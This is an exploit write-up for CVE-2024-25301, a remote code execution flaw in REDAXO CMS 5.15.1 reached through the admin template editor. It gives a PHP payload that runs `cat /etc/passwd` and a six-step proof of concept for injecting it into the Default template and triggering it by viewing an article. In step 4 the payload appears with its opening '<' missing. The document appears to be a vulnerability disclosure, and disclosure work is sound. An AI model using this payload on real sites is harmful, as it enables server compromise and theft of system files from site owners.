# 2024 REDAXO CMS RCE
- **Exploit Title:** REDAXO_CMS_Remote_Code_Execution
- **Date:** 2024-01-30
- **Exploit Author:** WoodMan
- **Vendor Homepage:** https://redaxo.org/
- **Software Link:** https://github.com/redaxo/redaxo
- **Version:** 5.15.1
- **Tested on:** Kali Linux + Docker
- **Payload:** `<?php system('cat /etc/passwd'); ?>`
- **CVE:** CVE-2024-25301

## Description
REDAXO CMS allows Remote Code Execution via the 'Template' in "/addons/structure/plugins/content/pages/templates.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the system.

## Proof of Concept
1. Log in as an administrator.
2. Navigate to the Templates page.
3. Edit the Default page.
4. Enter `?php system("cat /etc/passwd"); ?>` in the Template field.
5. Return to Structure and create a new Article, selecting Default as the Template.
6. View the page.
